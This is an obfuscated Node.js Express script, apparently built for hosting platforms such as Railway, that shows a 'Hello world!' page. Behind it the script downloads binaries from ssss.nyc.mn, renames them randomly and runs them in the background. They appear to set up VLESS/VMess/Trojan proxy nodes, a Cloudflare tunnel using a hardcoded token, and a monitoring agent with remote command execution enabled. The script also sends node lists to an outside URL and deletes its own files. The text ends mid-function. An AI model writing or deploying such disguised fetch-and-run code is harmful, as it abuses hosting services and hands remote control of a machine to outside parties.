const _0x33e8e2=_0x4ab6;(function(_0x409463,_0x5c4823){const _0xde58f3={_0x160c8f:0x18d,_0x27f20f:0x19f,_0x296ba6:0x1ea,_0x5a0036:0x150},_0x46851f=_0x4ab6,_0x46573d=_0x409463();while(!![]){try{const _0x2920f9=-parseInt(_0x46851f(0x162))/0x1+parseInt(_0x46851f(_0xde58f3._0x160c8f))/0x2*(-parseInt(_0x46851f(0x15d))/0x3)+-parseInt(_0x46851f(_0xde58f3._0x27f20f))/0x4+-parseInt(_0x46851f(_0xde58f3._0x296ba6))/0x5*(-parseInt(_0x46851f(0x1bf))/0x6)+-parseInt(_0x46851f(0x1cb))/0x7+-parseInt(_0x46851f(_0xde58f3._0x5a0036))/0x8*(parseInt(_0x46851f(0x194))/0x9)+-parseInt(_0x46851f(0x180))/0xa*(-parseInt(_0x46851f(0x18a))/0xb);if(_0x2920f9===_0x5c4823)break;else _0x46573d['push'](_0x46573d['shift']());}catch(_0x101d6d){_0x46573d['push'](_0x46573d['shift']());}}}(_0x3507,0x5ac58));const express=require(_0x33e8e2(0x17c)),app=express(),axios=require(_0x33e8e2(0x154)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x33e8e2(0x152)),exec=promisify(require(_0x33e8e2(0x1f5))[_0x33e8e2(0x1d7)]),{execSync}=require(_0x33e8e2(0x1f5)),UPLOAD_URL=process['env'][_0x33e8e2(0x1bb)]||'',PROJECT_URL=process[_0x33e8e2(0x142)][_0x33e8e2(0x1d9)]||'',AUTO_ACCESS=process[_0x33e8e2(0x142)][_0x33e8e2(0x1f9)]||![],FILE_PATH=process['env'][_0x33e8e2(0x1d5)]||_0x33e8e2(0x189),SUB_PATH=process['env'][_0x33e8e2(0x1c1)]||_0x33e8e2(0x1f2),PORT=process[_0x33e8e2(0x142)][_0x33e8e2(0x1c0)]||process[_0x33e8e2(0x142)][_0x33e8e2(0x151)]||0xbb8,UUID=process[_0x33e8e2(0x142)]['UUID']||_0x33e8e2(0x1af),NEZHA_SERVER=process[_0x33e8e2(0x142)][_0x33e8e2(0x197)]||'',NEZHA_PORT=process['env'][_0x33e8e2(0x166)]||'',NEZHA_KEY=process[_0x33e8e2(0x142)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x33e8e2(0x142)][_0x33e8e2(0x1da)]||_0x33e8e2(0x170),ARGO_AUTH=process[_0x33e8e2(0x142)][_0x33e8e2(0x1d6)]||_0x33e8e2(0x1bc),ARGO_PORT=process['env'][_0x33e8e2(0x1e9)]||0x1f41,CFIP=process[_0x33e8e2(0x142)][_0x33e8e2(0x199)]||_0x33e8e2(0x1e2),CFPORT=process['env']['CFPORT']||0x1bb,NAME=process[_0x33e8e2(0x142)][_0x33e8e2(0x1eb)]||'Railway';!fs[_0x33e8e2(0x1c4)](FILE_PATH)?(fs[_0x33e8e2(0x1f4)](FILE_PATH),console['log'](FILE_PATH+'\x20is\x20created')):console[_0x33e8e2(0x1a1)](FILE_PATH+_0x33e8e2(0x1a9));function _0x3507(){const _0x108378=['Content-Type','CFIP','fileName','unshift','&path=%2Fvless-argo%3Fed%3D2560#','https://oooo.serv00.net/add-url','127.0.0.1','1612532PCdVpc','stringify','log','rm\x20-rf\x20','https://amd64.ssss.nyc.mn/v1','readdirSync','/dev/null','freedom','post','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','\x20already\x20exists','utf-8','Empowerment\x20failed\x20for\x20','status','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','chmod','1da37f25-2d7b-4945-b02e-a33bab2fc128','false','base64','unlinkSync','Error\x20in\x20startserver:','tls','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','/api/delete-nodes','application/json','basename','8443','forEach','UPLOAD_URL','eyJhIjoiMDc2MDcyZjE3ZWMzY2I1NzFhZTUzYjYwYjVjNjRkZTMiLCJ0IjoiNWZjMzIwY2ItNDMzYi00N2I5LWE0YjAtZjM0NDk0NGYyMGI3IiwicyI6Ik1qQTVPVFV5WVRBdE5tRXhOaTAwWW1JeExXRmhPR010WlRRNE56TmhOVGhoTTJVdyJ9','https://amd64.ssss.nyc.mn/bot','&fp=firefox&type=ws&host=','5496YlIrAK','SERVER_PORT','SUB_PATH','2053','nohup\x20','existsSync','statSync','send','push','\x0a\x20\x20\x0atrojan://','\x20is\x20running','arm','3070256ekTgKf','NEZHA\x20variable\x20is\x20empty,skip\x20running','Add\x20automatic\x20access\x20task\x20faild:\x20','floor','/tunnel.yml\x20run','--tls','win32','listen','filter','config.yaml','FILE_PATH','ARGO_AUTH','exec','finish','PROJECT_URL','ARGO_DOMAIN','https://arm64.ssss.nyc.mn/agent','tunnel.yml','\x20-s\x20','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','/vless-argo','Skipping\x20adding\x20automatic\x20access\x20task','sub.txt','cdns.doon.eu.org','?security=tls&sni=','length','from','php\x20running\x20error:\x20','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','\x20-c\x20\x22','ARGO_PORT','1635NioELa','NAME','https://amd64.ssss.nyc.mn/web','boot.log','\x0a\x20\x20\x0avmess://','createWriteStream','https://amd64.ssss.nyc.mn/agent','2087','666','443','mkdirSync','child_process','\x20-p\x20','\x0a\x20\x20tunnel:\x20','substring','AUTO_ACCESS','\x20failed:\x20','data','response','Nodes\x20uploaded\x20successfully','platform','/vmess-argo','env','close','taskkill\x20/f\x20/im\x20','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','direct','\x0a\x20\x20\x20\x20','del\x20/f\x20/q\x20','vless','/config.json\x20>/dev/null\x202>&1\x20&','\x0aclient_secret:\x20','\x20-c\x20','\x20successfully','\x20>/dev/null\x202>&1','tunnel.json','24yRcVgV','PORT','util','Unhandled\x20error\x20in\x20startserver:','axios','isFile','match','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','join','all','none','Download\x20','?encryption=none&security=tls&sni=','150063BbliGR','aarch64','pipe','catch','quic','247737DNlPIu','https://arm64.ssss.nyc.mn/web','clear','split','NEZHA_PORT','readFileSync','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','2096','arch','error','Error\x20downloading\x20files:','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','https+local://8.8.8.8/dns-query','TunnelSecret','railway.karlxu.qzz.io','\x0a\x20\x20credentials-file:\x20','/vmess-argo?ed=2560','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','web\x20running\x20error:\x20','charAt','npm\x20running\x20error:\x20','fileUrl','list.txt','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','.exe\x20>\x20nul\x202>&1','express','includes','http','https://arm64.ssss.nyc.mn/bot','279640yVZTno','true','message','automatic\x20access\x20task\x20added\x20successfully','\x0avless://','config.json','Error\x20executing\x20command:\x20','App\x20is\x20running','test','./tmp','506MxjQuA','get','toString','2cxNdfa','\x20>/dev/null\x202>&1\x20&','map','Empowerment\x20success\x20for\x20','writeFileSync','&path=%2Ftrojan-argo%3Fed%3D2560#','pop','223731ZATyli','2083','\x20>\x20nul\x202>&1','NEZHA_SERVER'];_0x3507=function(){return _0x108378;};return _0x3507();}function generateRandomName(){const _0x852287={_0x57ab47:0x176,_0x3ebd98:0x1e4},_0x181b6a=_0x33e8e2,_0x55f1a4='abcdefghijklmnopqrstuvwxyz';let _0x3c3a79='';for(let _0x4f7f24=0x0;_0x4f7f24<0x6;_0x4f7f24++){_0x3c3a79+=_0x55f1a4[_0x181b6a(_0x852287._0x57ab47)](Math[_0x181b6a(0x1ce)](Math['random']()*_0x55f1a4[_0x181b6a(_0x852287._0x3ebd98)]));}return _0x3c3a79;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x33e8e2(0x158)](FILE_PATH,npmName),phpPath=path[_0x33e8e2(0x158)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x33e8e2(0x158)](FILE_PATH,botName),subPath=path[_0x33e8e2(0x158)](FILE_PATH,_0x33e8e2(0x1e1)),listPath=path[_0x33e8e2(0x158)](FILE_PATH,_0x33e8e2(0x179)),bootLogPath=path[_0x33e8e2(0x158)](FILE_PATH,_0x33e8e2(0x1ed)),configPath=path['join'](FILE_PATH,_0x33e8e2(0x185));function deleteNodes(){const _0xc73f73={_0x4814d3:0x1c4,_0x850b11:0x1e5,_0x3d914c:0x1d3,_0x1e9384:0x1e4,_0x3c9270:0x1b7,_0x14e964:0x160},_0x4cb6f5=_0x33e8e2;try{if(!UPLOAD_URL)return;if(!fs[_0x4cb6f5(_0xc73f73._0x4814d3)](subPath))return;let _0x17d97c;try{_0x17d97c=fs[_0x4cb6f5(0x167)](subPath,'utf-8');}catch{return null;}const _0x3296e7=Buffer[_0x4cb6f5(_0xc73f73._0x850b11)](_0x17d97c,_0x4cb6f5(0x1b1))['toString'](_0x4cb6f5(0x1aa)),_0x5df8ac=_0x3296e7[_0x4cb6f5(0x165)]('\x0a')[_0x4cb6f5(_0xc73f73._0x3d914c)](_0x1fb9ca=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x4cb6f5(0x188)](_0x1fb9ca));if(_0x5df8ac[_0x4cb6f5(_0xc73f73._0x1e9384)]===0x0)return;return axios[_0x4cb6f5(0x1a7)](UPLOAD_URL+_0x4cb6f5(0x1b6),JSON[_0x4cb6f5(0x1a0)]({'nodes':_0x5df8ac}),{'headers':{'Content-Type':_0x4cb6f5(_0xc73f73._0x3c9270)}})[_0x4cb6f5(_0xc73f73._0x14e964)](_0x5cd8df=>{return null;}),null;}catch(_0x1ba22b){return null;}}function cleanupOldFiles(){const _0x34e0fd={_0x51e81c:0x1ba},_0x123b60={_0x5f4487:0x158},_0x32824f=_0x33e8e2;try{const _0x46c65f=fs[_0x32824f(0x1a4)](FILE_PATH);_0x46c65f[_0x32824f(_0x34e0fd._0x51e81c)](_0x557463=>{const _0x5cdc9d=_0x32824f,_0x44588d=path[_0x5cdc9d(_0x123b60._0x5f4487)](FILE_PATH,_0x557463);try{const _0x5ce40d=fs[_0x5cdc9d(0x1c5)](_0x44588d);_0x5ce40d[_0x5cdc9d(0x155)]()&&fs[_0x5cdc9d(0x1b2)](_0x44588d);}catch(_0x31bd6e){}});}catch(_0x59e7e1){}}app[_0x33e8e2(0x18b)]('/',function(_0x25695b,_0x324745){const _0x26a3c7=_0x33e8e2;_0x324745[_0x26a3c7(0x1c6)]('Hello\x20world!');});async function generateConfig(){const _0x131a9b={_0x570e3b:0x1a5,_0x3c2044:0x149,_0x45418b:0x141,_0x4796da:0x15a,_0x4c388e:0x1df,_0x3925ba:0x1b4,_0x57c941:0x161,_0x4241df:0x17e,_0x34b886:0x16e,_0x332708:0x146,_0x22ed59:0x185},_0x45356f=_0x33e8e2,_0x259f1e={'log':{'access':_0x45356f(_0x131a9b._0x570e3b),'error':_0x45356f(_0x131a9b._0x570e3b),'loglevel':_0x45356f(0x15a)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x45356f(_0x131a9b._0x3c2044),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x45356f(0x15a),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x45356f(_0x131a9b._0x45418b),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x45356f(0x149),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':'tcp','security':_0x45356f(_0x131a9b._0x4796da)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x45356f(0x149),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x45356f(0x15a)},'streamSettings':{'network':'ws','security':_0x45356f(_0x131a9b._0x4796da),'wsSettings':{'path':_0x45356f(_0x131a9b._0x4c388e)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x45356f(_0x131a9b._0x3925ba),_0x45356f(0x161)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x45356f(0x141)}},'sniffing':{'enabled':!![],'destOverride':[_0x45356f(0x17e),_0x45356f(_0x131a9b._0x3925ba),_0x45356f(_0x131a9b._0x57c941)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x45356f(0x19e),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x45356f(0x15a),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x45356f(_0x131a9b._0x4241df),_0x45356f(_0x131a9b._0x3925ba),_0x45356f(_0x131a9b._0x57c941)],'metadataOnly':![]}}],'dns':{'servers':[_0x45356f(_0x131a9b._0x34b886)]},'outbounds':[{'protocol':_0x45356f(0x1a6),'tag':_0x45356f(_0x131a9b._0x332708)},{'protocol':'blackhole','tag':'block'}]};fs['writeFileSync'](path['join'](FILE_PATH,_0x45356f(_0x131a9b._0x22ed59)),JSON[_0x45356f(0x1a0)](_0x259f1e,null,0x2));}function getSystemArchitecture(){const _0x16a79d={_0xe0c885:0x16a,_0x12581d:0x15e},_0x5cc488=_0x33e8e2,_0x1c1633=os[_0x5cc488(_0x16a79d._0xe0c885)]();return _0x1c1633==='arm'||_0x1c1633==='arm64'||_0x1c1633===_0x5cc488(_0x16a79d._0x12581d)?_0x5cc488(0x1ca):'amd';}function downloadFile(_0x2d2592,_0x214246,_0x295252){const _0xaf276d={_0x42d103:0x1f4},_0x22f378={_0x3e4ee5:0x1fa,_0x26df22:0x182},_0x354939={_0xfd5b09:0x1fb,_0x5b5c1f:0x15f,_0x15811d:0x16b},_0x1ab033=_0x33e8e2,_0x5f0883=_0x2d2592;!fs['existsSync'](FILE_PATH)&&fs[_0x1ab033(_0xaf276d._0x42d103)](FILE_PATH,{'recursive':!![]});const _0x2729a5=fs[_0x1ab033(0x1ef)](_0x5f0883);axios({'method':_0x1ab033(0x18b),'url':_0x214246,'responseType':'stream'})['then'](_0x2b24ff=>{const _0x48bd4b={_0x1dc39c:0x1fa},_0x2a3712={_0x22f200:0x15b,_0x300453:0x14d},_0x1e675b=_0x1ab033;_0x2b24ff[_0x1e675b(_0x354939._0xfd5b09)][_0x1e675b(_0x354939._0x5b5c1f)](_0x2729a5),_0x2729a5['on'](_0x1e675b(0x1d8),()=>{const _0x59df51=_0x1e675b;_0x2729a5[_0x59df51(0x143)](),console[_0x59df51(0x1a1)](_0x59df51(_0x2a3712._0x22f200)+path['basename'](_0x5f0883)+_0x59df51(_0x2a3712._0x300453)),_0x295252(null,_0x5f0883);}),_0x2729a5['on'](_0x1e675b(_0x354939._0x15811d),_0x194f2e=>{const _0x500b29=_0x1e675b;fs['unlink'](_0x5f0883,()=>{});const _0x1f8dcf='Download\x20'+path['basename'](_0x5f0883)+_0x500b29(_0x48bd4b._0x1dc39c)+_0x194f2e['message'];console[_0x500b29(0x16b)](_0x1f8dcf),_0x295252(_0x1f8dcf);});})['catch'](_0x2468a0=>{const _0x5ddbd1=_0x1ab033,_0x2539bf='Download\x20'+path[_0x5ddbd1(0x1b8)](_0x5f0883)+_0x5ddbd1(_0x22f378._0x3e4ee5)+_0x2468a0[_0x5ddbd1(_0x22f378._0x26df22)];console[_0x5ddbd1(0x16b)](_0x2539bf),_0x295252(_0x2539bf);});}async function downloadFilesAndRun(){const _0x250a35={_0x193509:0x1a1,_0x54457b:0x159,_0x11b454:0x16b,_0x256b52:0x16c,_0x15ccbd:0x17d,_0x1da30b:0x165,_0x251e0e:0x1b9,_0x2da3a5:0x169,_0x2ae996:0x1b0,_0x31443b:0x14b,_0x1e87b9:0x191,_0x529767:0x1d4,_0x3ca642:0x1a1,_0x32adaa:0x1e6,_0x536a8d:0x1f3,_0x14fe8:0x169,_0x30b80a:0x1f1,_0xeb5ed6:0x195,_0x1d3f0a:0x1c2,_0x10e000:0x17d,_0x119589:0x1d0,_0x3981b2:0x1c3,_0x453c6f:0x1e7,_0x224c16:0x177,_0x1b2384:0x1cc,_0x4d624e:0x14c,_0x5df557:0x175,_0x5ce45e:0x156,_0x568882:0x1cf,_0x14cf0b:0x16d,_0x29df98:0x17a,_0x5f2615:0x18e,_0x306c72:0x1c9,_0x1bf925:0x16b},_0x4e88b8=_0x33e8e2,_0x1d9a79=getSystemArchitecture(),_0x3b97cb=getFilesForArchitecture(_0x1d9a79);if(_0x3b97cb['length']===0x0){console[_0x4e88b8(_0x250a35._0x193509)](_0x4e88b8(0x1b5));return;}const _0x542a88=_0x3b97cb[_0x4e88b8(0x18f)](_0x5b5b5d=>{return new Promise((_0x2b0050,_0x19c0d0)=>{const _0x4ee17a=_0x4ab6;downloadFile(_0x5b5b5d[_0x4ee17a(0x19a)],_0x5b5b5d[_0x4ee17a(0x178)],(_0x1196d6,_0x9c96a8)=>{_0x1196d6?_0x19c0d0(_0x1196d6):_0x2b0050(_0x9c96a8);});});});try{await Promise[_0x4e88b8(_0x250a35._0x54457b)](_0x542a88);}catch(_0x45a7b7){console[_0x4e88b8(_0x250a35._0x11b454)](_0x4e88b8(_0x250a35._0x256b52),_0x45a7b7);return;}function _0xfc3b7b(_0x56d5f4){const _0x114340=_0x4e88b8,_0x70bd28=0x1fd;_0x56d5f4[_0x114340(0x1ba)](_0x79dc8d=>{const _0x5e4d98={_0x1ad2a4:0x16b,_0x1811e0:0x1a1,_0x3cc687:0x190},_0x2a822d=_0x114340;fs[_0x2a822d(0x1c4)](_0x79dc8d)&&fs[_0x2a822d(0x1ae)](_0x79dc8d,_0x70bd28,_0x5e15a0=>{const _0x57ee54=_0x2a822d;_0x5e15a0?console[_0x57ee54(_0x5e4d98._0x1ad2a4)](_0x57ee54(0x1ab)+_0x79dc8d+':\x20'+_0x5e15a0):console[_0x57ee54(_0x5e4d98._0x1811e0)](_0x57ee54(_0x5e4d98._0x3cc687)+_0x79dc8d+':\x20'+_0x70bd28['toString'](0x8));});});}const _0xcfb2a5=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0xfc3b7b(_0xcfb2a5);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xd7a12f=NEZHA_SERVER[_0x4e88b8(_0x250a35._0x15ccbd)](':')?NEZHA_SERVER[_0x4e88b8(_0x250a35._0x1da30b)](':')[_0x4e88b8(0x193)]():'',_0x2e49dd=new Set(['443',_0x4e88b8(_0x250a35._0x251e0e),_0x4e88b8(_0x250a35._0x2da3a5),'2087',_0x4e88b8(0x195),'2053']),_0x33b5cd=_0x2e49dd['has'](_0xd7a12f)?_0x4e88b8(0x181):_0x4e88b8(_0x250a35._0x2ae996),_0xbede20=_0x4e88b8(_0x250a35._0x31443b)+NEZHA_KEY+_0x4e88b8(0x168)+NEZHA_SERVER+_0x4e88b8(0x1de)+_0x33b5cd+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x4e88b8(_0x250a35._0x1e87b9)](path['join'](FILE_PATH,_0x4e88b8(_0x250a35._0x529767)),_0xbede20);const _0x191037=_0x4e88b8(0x1c3)+phpPath+_0x4e88b8(0x1e8)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x191037),console[_0x4e88b8(_0x250a35._0x3ca642)](phpName+_0x4e88b8(0x1c9)),await new Promise(_0x29e98a=>setTimeout(_0x29e98a,0x3e8));}catch(_0x12210b){console['error'](_0x4e88b8(_0x250a35._0x32adaa)+_0x12210b);}}else{let _0x1425f4='';const _0x425f2b=[_0x4e88b8(_0x250a35._0x536a8d),_0x4e88b8(_0x250a35._0x251e0e),_0x4e88b8(_0x250a35._0x14fe8),_0x4e88b8(_0x250a35._0x30b80a),_0x4e88b8(_0x250a35._0xeb5ed6),_0x4e88b8(_0x250a35._0x1d3f0a)];_0x425f2b[_0x4e88b8(_0x250a35._0x10e000)](NEZHA_PORT)&&(_0x1425f4=_0x4e88b8(_0x250a35._0x119589));const _0x41d11e=_0x4e88b8(_0x250a35._0x3981b2)+npmPath+_0x4e88b8(0x1dd)+NEZHA_SERVER+':'+NEZHA_PORT+_0x4e88b8(0x1f6)+NEZHA_KEY+'\x20'+_0x1425f4+_0x4e88b8(_0x250a35._0x453c6f);try{await exec(_0x41d11e),console[_0x4e88b8(_0x250a35._0x3ca642)](npmName+_0x4e88b8(0x1c9)),await new Promise(_0x2dda2a=>setTimeout(_0x2dda2a,0x3e8));}catch(_0x22ff15){console[_0x4e88b8(0x16b)](_0x4e88b8(_0x250a35._0x224c16)+_0x22ff15);}}}else console[_0x4e88b8(_0x250a35._0x193509)](_0x4e88b8(_0x250a35._0x1b2384));const _0x551fb6=_0x4e88b8(_0x250a35._0x3981b2)+webPath+_0x4e88b8(_0x250a35._0x4d624e)+FILE_PATH+_0x4e88b8(0x14a);try{await exec(_0x551fb6),console['log'](webName+_0x4e88b8(0x1c9)),await new Promise(_0x31a9e8=>setTimeout(_0x31a9e8,0x3e8));}catch(_0x4b6f29){console[_0x4e88b8(0x16b)](_0x4e88b8(_0x250a35._0x5df557)+_0x4b6f29);}if(fs[_0x4e88b8(0x1c4)](botPath)){let _0x48f7cf;if(ARGO_AUTH[_0x4e88b8(_0x250a35._0x5ce45e)](/^[A-Z0-9a-z=]{120,250}$/))_0x48f7cf=_0x4e88b8(0x1a8)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x48f7cf='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x4e88b8(_0x250a35._0x568882):_0x48f7cf=_0x4e88b8(_0x250a35._0x14cf0b)+FILE_PATH+_0x4e88b8(_0x250a35._0x29df98)+ARGO_PORT;try{await exec(_0x4e88b8(_0x250a35._0x3981b2)+botPath+'\x20'+_0x48f7cf+_0x4e88b8(_0x250a35._0x5f2615)),console[_0x4e88b8(0x1a1)](botName+_0x4e88b8(_0x250a35._0x306c72)),await new Promise(_0x4373fc=>setTimeout(_0x4373fc,0x7d0));}catch(_0x3f4246){console[_0x4e88b8(_0x250a35._0x1bf925)](_0x4e88b8(0x186)+_0x3f4246);}}await new Promise(_0x72ecb3=>setTimeout(_0x72ecb3,0x1388));}function getFilesForArchitecture(_0x1ad93b){const _0x516651={_0x4b3d64:0x1ca,_0x5f0019:0x163,_0x52f285:0x1ec,_0x881d41:0x19b,_0x31e4fb:0x1a3},_0x533069=_0x33e8e2;let _0x1f0bdb;_0x1ad93b===_0x533069(_0x516651._0x4b3d64)?_0x1f0bdb=[{'fileName':webPath,'fileUrl':_0x533069(_0x516651._0x5f0019)},{'fileName':botPath,'fileUrl':_0x533069(0x17f)}]:_0x1f0bdb=[{'fileName':webPath,'fileUrl':_0x533069(_0x516651._0x52f285)},{'fileName':botPath,'fileUrl':_0x533069(0x1bd)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x4202e0=_0x1ad93b===_0x533069(_0x516651._0x4b3d64)?_0x533069(0x1db):_0x533069(0x1f0);_0x1f0bdb[_0x533069(_0x516651._0x881d41)]({'fileName':npmPath,'fileUrl':_0x4202e0});}else{const _0x1d5ea6=_0x1ad93b===_0x533069(0x1ca)?'https://arm64.ssss.nyc.mn/v1':_0x533069(_0x516651._0x31e4fb);_0x1f0bdb['unshift']({'fileName':phpPath,'fileUrl':_0x1d5ea6});}}return _0x1f0bdb;}function argoType(){const _0x25fcd4={_0x37f047:0x1a1,_0x30a09b:0x145,_0x3ccc05:0x158,_0x3e57a1:0x14f,_0x8d0fbc:0x1f7,_0x203947:0x165,_0x1efc0d:0x171,_0x11b2bb:0x158,_0x3f8338:0x174,_0x221cf3:0x191},_0x255fb6=_0x33e8e2;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x255fb6(_0x25fcd4._0x37f047)](_0x255fb6(_0x25fcd4._0x30a09b));return;}if(ARGO_AUTH[_0x255fb6(0x17d)](_0x255fb6(0x16f))){fs[_0x255fb6(0x191)](path[_0x255fb6(_0x25fcd4._0x3ccc05)](FILE_PATH,_0x255fb6(_0x25fcd4._0x3e57a1)),ARGO_AUTH);const _0x47ecec=_0x255fb6(_0x25fcd4._0x8d0fbc)+ARGO_AUTH[_0x255fb6(_0x25fcd4._0x203947)]('\x22')[0xb]+_0x255fb6(_0x25fcd4._0x1efc0d)+path[_0x255fb6(_0x25fcd4._0x11b2bb)](FILE_PATH,'tunnel.json')+_0x255fb6(_0x25fcd4._0x3f8338)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x255fb6(_0x25fcd4._0x221cf3)](path[_0x255fb6(_0x25fcd4._0x11b2bb)](FILE_PATH,_0x255fb6(0x1dc)),_0x47ecec);}else console['log']('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}argoType();function _0x4ab6(_0x3fbb26,_0x5f0190){const _0x3507ca=_0x3507();return _0x4ab6=function(_0x4ab6c6,_0x597a79){_0x4ab6c6=_0x4ab6c6-0x13f;let _0x144b19=_0x3507ca[_0x4ab6c6];return _0x144b19;},_0x4ab6(_0x3fbb26,_0x5f0190);}async function extractDomains(){const _0x396e27={_0x182a9b:0x1a1,_0x215b8c:0x1ed,_0x22986e:0x1ba,_0x3a9562:0x1e4,_0x312a97:0x1ad,_0x68164c:0x158,_0x44f627:0x16d,_0x434795:0x17a},_0x407705={_0xd1bc0b:0x157},_0x28606f={_0x5acbb4:0x17b},_0x27f199={_0x49aff5:0x156},_0x4c96e3=_0x33e8e2;let _0x52a237;if(ARGO_AUTH&&ARGO_DOMAIN)_0x52a237=ARGO_DOMAIN,console[_0x4c96e3(_0x396e27._0x182a9b)]('ARGO_DOMAIN:',_0x52a237),await _0x26cc73(_0x52a237);else try{const _0x58ae9f=fs[_0x4c96e3(0x167)](path['join'](FILE_PATH,_0x4c96e3(_0x396e27._0x215b8c)),_0x4c96e3(0x1aa)),_0x251c6a=_0x58ae9f[_0x4c96e3(0x165)]('\x0a'),_0x438ac6=[];_0x251c6a[_0x4c96e3(_0x396e27._0x22986e)](_0x4bcec0=>{const _0x49e63a=_0x4c96e3,_0x246612=_0x4bcec0[_0x49e63a(_0x27f199._0x49aff5)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x246612){const _0x17de80=_0x246612[0x1];_0x438ac6[_0x49e63a(0x1c7)](_0x17de80);}});if(_0x438ac6[_0x4c96e3(_0x396e27._0x3a9562)]>0x0)_0x52a237=_0x438ac6[0x0],console['log']('ArgoDomain:',_0x52a237),await _0x26cc73(_0x52a237);else{console[_0x4c96e3(0x1a1)](_0x4c96e3(_0x396e27._0x312a97)),fs['unlinkSync'](path[_0x4c96e3(_0x396e27._0x68164c)](FILE_PATH,_0x4c96e3(_0x396e27._0x215b8c)));async function _0x136415(){const _0x1a38ea=_0x4c96e3;try{process[_0x1a38ea(0x140)]===_0x1a38ea(0x1d1)?await exec(_0x1a38ea(0x144)+botName+_0x1a38ea(_0x28606f._0x5acbb4)):await exec('pkill\x20-f\x20\x22['+botName['charAt'](0x0)+']'+botName[_0x1a38ea(0x1f8)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x32b691){}}_0x136415(),await new Promise(_0x541a5e=>setTimeout(_0x541a5e,0xbb8));const _0x39e907=_0x4c96e3(_0x396e27._0x44f627)+FILE_PATH+_0x4c96e3(_0x396e27._0x434795)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x39e907+'\x20>/dev/null\x202>&1\x20&'),console[_0x4c96e3(0x1a1)](botName+_0x4c96e3(0x1c9)),await new Promise(_0x21e7fd=>setTimeout(_0x21e7fd,0xbb8)),await extractDomains();}catch(_0x497a95){console['error'](_0x4c96e3(0x186)+_0x497a95);}}}catch(_0x402f2a){console[_0x4c96e3(0x16b)]('Error\x20reading\x20boot.log:',_0x402f2a);}async function _0x26cc73(_0x5e4148){const _0x1f1573={_0x5c050b:0x1be,_0x155fcc:0x1e5,_0x549d35:0x1c8,_0x146e1e:0x1e3,_0x3dcdf7:0x147,_0x1cb66e:0x1a1,_0x42de0d:0x1e5,_0x5b2b14:0x1e5},_0x509815=_0x4c96e3,_0x1231fb=execSync(_0x509815(_0x407705._0xd1bc0b),{'encoding':_0x509815(0x1aa)}),_0x593769=_0x1231fb['trim'](),_0x889a99=NAME?NAME+'-'+_0x593769:_0x593769;return new Promise(_0x2bf336=>{const 